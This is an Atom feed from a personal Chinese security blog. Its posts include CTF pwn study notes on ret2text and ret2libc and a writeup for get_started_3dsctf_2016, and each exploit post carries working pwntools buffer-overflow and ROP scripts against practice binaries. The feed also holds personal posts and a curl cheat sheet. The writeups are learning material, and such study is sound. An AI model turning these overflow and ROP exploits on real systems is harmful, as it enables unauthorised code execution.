<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>8023</title>
  
  <subtitle>可是我啊文采黯然，写不出漂亮的话，只能通俗了事地叙述着心中憾事</subtitle>
  <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
  
  <link href="https://pr0b1em.github.io/"/>
  <updated>2021-06-20T12:53:09.534Z</updated>
  <id>https://pr0b1em.github.io/</id>
  
  <author>
    <name>Pr0b1em</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ret2text</title>
    <link href="https://pr0b1em.github.io/2021/06/20/ret2text/"/>
    <id>https://pr0b1em.github.io/2021/06/20/ret2text/</id>
    <published>2021-06-20T09:28:46.000Z</published>
    <updated>2021-06-20T12:53:09.534Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段</p><h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p><p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p><p>IDA打开，F5查看main函数</p><p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p><p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p><p>看见system函数</p><p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p><p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p><p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p><p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p><p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure><p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p><p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p><p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>]]></content>
    
    
    <summary type="html">ret2text类型题目解法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2libc</title>
    <link href="https://pr0b1em.github.io/2021/06/20/ret2libc/"/>
    <id>https://pr0b1em.github.io/2021/06/20/ret2libc/</id>
    <published>2021-06-20T07:26:12.000Z</published>
    <updated>2021-06-20T12:48:57.670Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p><p>ret2libc即控制函数执行libc中的函数,通常选择执行system(“/bin/sh”)。</p><h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p><p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p><h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p><p>1.泄露 一个调用函数的 地址</p><p>2.获取 libc 版本</p><p>3.获取 system 地址与 /bin/sh 的地址</p><p>4.再次执行源程序</p><p>5.触发栈溢出执行 system(‘/bin/sh’)</p><p>shellcode结构：</p><p><img src="/img/shellcode.png"></p><p>正常堆栈布局：</p><p><img src="/img/1.png"></p><p>ret2libc执行system的堆栈布局：</p><p><img src="/img/2.png"></p><p>具体例题可以查看[OGeek2019]babyrop的writeup。</p><p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>]]></content>
    
    
    <summary type="html">ret2libc类型题目解法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>blog诞生日2021.6.17</title>
    <link href="https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/"/>
    <id>https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:16:37.048Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>]]></content>
    
    
    <summary type="html">博客诞生日！</summary>
    
    
    
    <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
    
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/"/>
    <id>https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:17:06.067Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>先查壳，32位，开了NX</p><p><img src="/img/image-20210425011728468.png"></p><p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p><p><img src="/img/image-20210425011933854.png"></p><p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p><p><img src="/img/image-20210425012146370.png"></p><p>点击a1查看到了在栈中的位置</p><p><img src="/img/image-20210425012353464.png"></p><p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p><p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p><p><img src="/img/image-20210425012826978.png"></p><p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p><p><img src="/img/image-20210425013007535.png"></p><p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p><p><img src="/img/image-20210425013149728.png"></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>但是没办法得到flag，这里还发现这样远程是无法连接的</p><p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p><p><img src="/img/image-20210425162841539.png"></p><h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20210425165227769.png"></p><p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>]]></content>
    
    
    <summary type="html">未完待续......</summary>
    
    
    
    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>飞蓬大将军</title>
    <link href="https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/"/>
    <id>https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:17:17.524Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p><p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>]]></content>
    
    
    <summary type="html">永远的仙剑</summary>
    
    
    
    <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
    
    
  </entry>
  
  <entry>
    <title>CURL</title>
    <link href="https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/"/>
    <id>https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:16:53.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span><p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>]]></content>
    
    
    <summary type="html">curl常用方法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
